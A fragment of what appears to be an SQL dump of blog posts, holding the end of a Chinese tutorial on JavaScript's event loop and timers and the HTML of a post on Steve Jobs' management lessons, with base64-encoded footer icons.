除了放置异步任务的事件，"任务队列"还可以放置定时事件，即指定某些代码在多少时间之后执行。这叫做"定时器"（timer）功能，也就是定时执行的代码。 定时器功能主要由setTimeout()和setInterval()这两个函数来完成，它们的内部运行机制完全一样，区别在于前者指定的代码是一次性执行，后者则为反复执行。以下主要讨论setTimeout()。 setTimeout()接受两个参数，第一个是回调函数，第二个是推迟执行的毫秒数。 console.log(1); setTimeout(function(){console.log(2);},1000); console.log(3); 上面代码的执行结果是1，3，2，因为setTimeout()将第二行推迟到1000毫秒之后执行。 如果将setTimeout()的第二个参数设为0，就表示当前代码执行完（执行栈清空）以后，立即执行（0毫秒间隔）指定的回调函数。 setTimeout(function(){console.log(1);}, 0); console.log(2); 上面代码的执行结果总是2，1，因为只有在执行完第二行以后，系统才会去执行"任务队列"中的回调函数。 总之，setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，也就是说，尽可能早得执行。它在"任务队列"的尾部添加一个事件，因此要等到同步任务和"任务队列"现有的事件都处理完，才会得到执行。 HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。在此之前，老版本的浏览器都将最短间隔设为10毫秒。另外，对于那些DOM的变动（尤其是涉及页面重新渲染的部分），通常不会立即执行，而是每16毫秒执行一次。这时使用requestAnimationFrame()的效果要好于setTimeout()。 需要注意的是，setTimeout()只是将事件插入了"任务队列"，必须等到当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。要是当前代码耗时很长，有可能要等很久，所以并没有办法保证，回调函数一定会在setTimeout()指定的时间执行。 六、Node.js的Event Loop Node.js也是单线程的Event Loop，但是它的运行机制不同于浏览器环境。 请看下面的示意图（作者@BusyRich）。 根据上图，Node.js的运行机制如下。 （1）V8引擎解析JavaScript脚本。 （2）解析后的代码，调用Node API。 （3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。 （4）V8引擎再将结果返回给用户。 除了setTimeout和setInterval这两个方法，Node.js还提供了另外两个与"任务队列"有关的方法：process.nextTick和setImmediate。它们可以帮助我们加深对"任务队列"的理解。 process.nextTick方法可以在当前"执行栈"的尾部----下一次Event Loop（主线程读取"任务队列"）之前----触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前"任务队列"的尾部添加事件，也就是说，它指定的任务总是在下一次Event Loop时执行，这与setTimeout(fn, 0)很像。请看下面的例子（via StackOverflow）。 process.nextTick(function A() { console.log(1); process.nextTick(function B(){console.log(2);}); }); setTimeout(function timeout() { console.log(''TIMEOUT FIRED''); }, 0) // 1 // 2 // TIMEOUT FIRED 上面代码中，由于process.nextTick方法指定的回调函数，总是在当前"执行栈"的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前"执行栈"执行。 现在，再看setImmediate。 setImmediate(function A() { console.log(1); setImmediate(function B(){console.log(2);}); }); setTimeout(function timeout() { console.log(''TIMEOUT FIRED''); }, 0); 上面代码中，setImmediate与setTimeout(fn,0)各自添加了一个回调函数A和timeout，都是在下一次Event Loop触发。那么，哪个回调函数先执行呢？答案是不确定。运行结果可能是1--TIMEOUT FIRED--2，也可能是TIMEOUT FIRED--1--2。 令人困惑的是，Node.js文档中称，setImmediate指定的回调函数，总是排在setTimeout前面。实际上，这种情况只发生在递归调用的时候。 setImmediate(function (){ setImmediate(function A() { console.log(1); setImmediate(function B(){console.log(2);}); }); setTimeout(function timeout() { console.log(''TIMEOUT FIRED''); }, 0); }); // 1 // TIMEOUT FIRED // 2 上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1--TIMEOUT FIRED--2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行。 我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前"执行栈"一次执行完，多个setImmediate可能则需要多次loop才能执行完。事实上，这正是Node.js 10.0版添加setImmediate方法的原因，否则像下面这样的递归调用process.nextTick，将会没完没了，主线程根本不会去读取"事件队列"！ process.nextTick(function foo() { process.nextTick(foo); }); 事实上，现在要是你写出递归的process.nextTick，Node.js会抛出一个警告，要求你改成setImmediate。 另外，由于process.nextTick指定的回调函数是在本次"事件循环"触发，而setImmediate指定的是在下次"事件循环"触发，所以很显然，前者总是比后者发生得早，而且执行效率也高（因为不用检查"任务队列"）。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年10月 8日 更多内容： 档案 » JavaScript 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(12, 'http://www.ruanyifeng.com/blog/2014/10/real-leadership-lessons-of-steve-jobs.html', '乔布斯的管理课', '<p>2011年11月出版的《乔布斯传》很畅销，也写得很好，我还写过一篇<a href="http://www.ruanyifeng.com/blog/2013/03/apple_inc_and_division_of_labor.html">读后感</a>。</p>\n\n        <p>但是，很少有人知道，它的作者沃尔特·艾萨克森（Walter Isaacson）在6个月后的2012年4月，为《哈佛商业评论》写过一篇2万多字的长文，总结乔布斯的管理艺术，名字叫做《乔布斯的管理课：卓越领导力的14位密码》（The Real Leadership Lessons of Steve Jobs，<a href="http://hbr.org/2012/04/the-real-leadership-lessons-of-steve-jobs/">英文版在线阅读</a>，<a href="https://www.aspeninstitute.org/sites/default/files/content/docs/about/HBR-Isaacson.pdf">PDF下载</a>，<a href="http://www.hbrchina.org/2012-06-21/53.html">中文版在线阅读</a>，<a href="http://www.amazon.cn/%E5%93%88%E4%BD%9B%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA-%E5%A2%9E%E5%88%8A-%E4%B9%94%E5%B8%83%E6%96%AF%E7%9A%84%E7%AE%A1%E7%90%86%E8%AF%BE-%E5%93%88%E4%BD%9B%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA/dp/B00LZJUFPA">亚马逊</a>，<a href="https://read.douban.com/ebook/5749504/">豆瓣</a>）。</p>\n\n<p><img alt="乔布斯的管理课" src="http://image.beekka.com/blog/2014/bg2014100201.jpg" title="" /></p>\n\n<p>这篇长文基本上是原著的浓缩，但是有一些新的细节。如果你没有时间读原著，可以只读它。下面，我摘录几个打动我的段落。</p>\n\n<h2>一、保持专注</h2>\n\n<p>1997年，乔布斯重新执掌濒临破产的苹果公司。那时，苹果公司有庞大的产品线，单单Macintosh电脑就有十几个版本。乔布斯决定砍掉大部分产品。</p>\n\n<p><img alt="products" src="http://image.beekka.com/blog/2014/bg2014100202.png" title="" /></p>\n\n<p>他在白板上画了一个2x2的网格。"这才是我们要的，"在两栏的底部，他写下"普通消费者"（Consumer）和"专业用户"（Pro），在两行的前端他写下"桌面设备"（Desktop）和"便携设备"（Portable）。他告诉团队，我们的工作就是要生产四个伟大的产品，表格的每一格代表一个产品，其余的产品应该全部取消。</p>\n\n<p>还有一次，乔布斯问大家："我们下一步最应该做的10件事是什么？"，大家七嘴八舌，列出了10件事。乔布斯划掉了后面7件，说我们只做最前面的3件。</p>\n\n<h2>二、保持简单</h2>\n\n<p>乔布斯参观施乐公司的Palo Alto实验室，见到了刚刚发明的鼠标。他一下子被吸引住了。</p>\n\n<p><img alt="Palo Alto" src="http://image.beekka.com/blog/2014/bg2014100205.jpg" title="" /></p>\n\n<p>回来以后，他告诉设计人员，立刻仿造一个。但是，施乐公司的鼠标有三个键，乔布斯要求苹果的鼠标只能有一个键。</p>\n\n<p><img alt="Apple II mouse" src="http://image.beekka.com/blog/2014/bg2014100206.jpg" title="" /></p>\n\n<p>设计iPod操作界面时，乔布斯坚持最多只需三次点击，用户就能完成所有操作。</p>\n\n<p>乔布斯经常问别人，你觉得有没有什么东西过于复杂了？他以此作为参考，决定下一步要开发的产品。</p>\n\n<h2>三、追求完美</h2>\n\n<p>乔布斯从小养成追求完美的性格。有一次，他与父亲在后院搭篱笆。父亲要求篱笆的背面也要精心施工。乔布斯说："谁会去看篱笆的背面？"父亲回答："你会看到。"</p>\n\n<p><img alt="Macintosh Case" src="http://image.beekka.com/blog/2014/bg2014100204.jpg" title="" /></p>\n\n<p>开发Macintosh电脑时，他不顾整个团队的反对，要求机箱内部的电路板和电线也要整齐美观。设计定案后，他把设计人员的签名镌刻在机箱上，"真正的工匠都对自己的作品签名"。</p>\n\n<h2>四、重视设计</h2>\n\n<p>乔布斯重返苹果后的第一件产品，是彩色的桌面电脑iMac。它的顶部有一个把手，并不是那么有用，有谁会提着桌面电脑走来走去呢？</p>\n\n<p><img alt="iMac" src="http://image.beekka.com/blog/2014/bg2014100203.jpg" title="" /></p>\n\n<p>生产部门希望去掉这个把手，这样可以降低成本。但是，乔布斯坚持要加上。因为，他觉得普通消费者仍然对电脑有敬畏感，认为那是高深莫测的产品。他希望，苹果的产品能够给人一种友好的、平易近人的、易于操作的感觉。这个把手可以传递这样的信号，仿佛在那里说，快来使用我吧。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-10-02T12:13:53+08:00">2014年10月 2日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/startup/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 创业</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAAKT2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AUkSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXXPues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgABeNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAtAGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dXLh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzABhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/phCJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhMWE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQAkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+IoUspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdpr+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZD5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61MbU2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllirSKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79up+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6VhlWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lOk06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7RyFDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3IveRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+BZ7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5pDoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5qPNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIsOpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQrAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1dT1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aXDm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3SPVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKaRptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfVP1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADqYAAAOpgAABdvkl/FRgAABPZJREFUeNqMyXtM1WUcx/FnNTdreAVCEEThyEFUrM2kwkpS05qVl8rugVpRUelaJdZaWWktdZKHssImgV04osgBCbwAa2Whm6GWoXHxcD1wHiI4t9/z/H68+wO3av1R3+217/b+CFStsHq/W2V1HW+wOmq8VkeN/E+dR/7SUSOtrmOnLc93jxA6LsTw71XLrUsHsNwHsdxl/09HGVb7QawOF1bn4ZF26QDDsmqNsH7be9psKcJs+fy/tRZjXvwM//678BVdT6BsMarhxZHeug+reW+TMC84+s0LDv4tH7PZgdXqwGrLx7yYP9KaHISOvUCwYh3+4iUMOiIJVmSMbBfy+4X581Zp/ryVfzi/FfPXd1AntxNwvkvg6zfQZ7Zg/rIV8/x7qB9fJlT/JPrcm4SOPctg3ihCR5dhNu2QQjfmSt2Yi27MRf+Uiz67Ef1TLv7Ct5CPZtMzJ4N2243Ij7Kwmjdhnt+EUZeFr/BmhvYkoBqewl8yD9/eCejGTVLoUzlSn8pBn8xBn85B/fAcf7z6PJ7rl9KdNBdP6nwuJc2jL+9+jJrXGNr1On9seZHgkQ0ESq8l4EzBOLKMod1XoE6slUKfXCd1wxp0Qxb6RBYDLzxGz8xb8aSm05u2kL4bF9N902I89yzHe986PEseoGP2YjqfvpNQeTr+4rmEKucz6LgS9f1jUuiy+VIfvxvz1GoGN99Hz8wFeGan0zl3Ae4lK3A/vJb2x7PpWPEI3bevoHfJKtypt9H1UgbDZx5E//goofJF+AtmoasWSaG2jZE6P5zg9hQ8Nyyie1Y6rQ+vpafMhdHXx7BpgjWMr7sbT5kL9/IHcUck0X3LtfgLVqAP3YAumoHeHYvaPkYKlRcudf54Bh5KpjP5Fi69tplgIMCQabK/rIxtO3bgqqxkmJHzdXbRknYbrWIcrWEJ9D8RjXaMRe2ciNo5QQr1QYRUjnC8C1Nxr1pD0O/HFwyQmZmJ3W4nLS0Nm83G+vXrsSwLgP6vS2kWo/lNjKN57gTMTyJRH0Si8iZKoXZdI5Ujkt55SXRtfBuAffv2sXLlSpxOJ9n